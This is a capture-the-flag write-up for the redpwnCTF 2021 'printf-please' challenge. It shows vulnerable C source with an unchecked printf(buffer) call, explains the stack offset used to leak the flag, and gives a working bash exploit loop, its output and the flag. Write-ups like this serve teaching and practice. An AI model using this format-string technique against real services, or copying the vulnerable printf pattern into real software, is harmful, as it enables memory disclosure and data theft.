# redpwnCTF 2021

## printf-please

> NotDeGhost
> 
> rob keeps making me write beginner pwn! i'll show him...
>
> `nc mc.ax 31569`
>
> [please](please) [please.c](please.c)


Tags: _pwn_ _x86-64_ _format-string_


## Summary

Classic _leak the flag from the stack_.


## Analysis

### Source Included

```c
#include <stdio.h>
#include <fcntl.h>

int main(void)
{
  char buffer[0x200];
  char flag[0x200];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  memset(buffer, 0, sizeof(buffer));
  memset(flag, 0, sizeof(flag));

  int fd = open("flag.txt", O_RDONLY);
  if (fd == -1) {
    puts("failed to read flag. please contact an admin if this is remote");
    exit(1);
  }

  read(fd, flag, sizeof(flag));
  close(fd);

  puts("what do you say?");

  read(0, buffer, sizeof(buffer) - 1);
  buffer[strcspn(buffer, "\n")] = 0;

  if (!strncmp(buffer, "please", 6)) {
    printf(buffer);
    puts(" to you too!");
  }
}
```

The flag is read into `flag` (on stack).  To read, use the `printf(buffer)` vuln to read any arbitrary value from the stack with `%xx$p` where `xx` starts at `06` (top of stack). Since `buffer` is allocated first, you'll need to start at `0x200 / 8 + 6` (70).

> Oh, don't for get to start with `please` :-)


## Exploit

```bash
#!/bin/bash

for ((i=70;;i++)) {
    B=$(echo 'please %'$i'$p' | nc mc.ax 31569 | grep please | awk '{print $2}')
    if echo $B | grep '7d' >/dev/null 2>&1
    then
        echo $B | sed 's/.*7d/7d/' | xxd -r -p | rev; echo
        break
    fi
    echo $B | awk -Fx '{print $2}' | xxd -r -p | rev
}
```


Output:

```bash
# ./sol.sh
flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
```
